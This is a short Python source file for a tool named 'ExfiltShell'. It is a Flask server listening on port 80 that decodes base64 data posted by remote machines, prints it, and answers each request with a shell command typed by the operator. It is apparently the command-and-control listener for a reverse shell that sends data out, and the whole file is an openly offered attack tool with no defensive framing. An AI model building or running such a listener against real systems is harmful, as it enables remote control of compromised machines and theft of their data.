import logging
import base64
from flask import Flask, request
from colorama import Fore, Style
import pyfiglet

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

def generate_full_banner(title, description, developers):
    banner_title = pyfiglet.figlet_format(title, font='big')
    banner_description = description

    max_name_length = max(len(name) for name in developers)
    padding = ' ' * (max_name_length + 2)  # 2 for spacing and bullet point
    developers_banner = [f'{padding}{Fore.BLUE}• {name}{Style.RESET_ALL}' for name in developers]
    developers_banner.append('')
    developers_banner.append('')
    developers_banner = '\n'.join(developers_banner)

    full_banner = f'{Fore.MAGENTA}{Style.BRIGHT}{banner_title}{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}\n{Style.RESET_ALL} {banner_description}\n\n{developers_banner}'
    return full_banner

@app.route('/', methods=['POST'])
def handle_post_request():
    json_data = request.get_json()
    base64_data = json_data["data"]
    decoded_data = base64.b64decode(base64_data).decode('utf-8')
    print(decoded_data)
    command = input('Shell$ ')
    return command

title = 'ExfiltShell'
description = 'A tool for shell-based communication'
developers = ['Oussema Jaouadi', 'Hassen Bouchhiwa', 'Ghassen Abida']

banner = generate_full_banner(title, description, developers)
print(banner)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
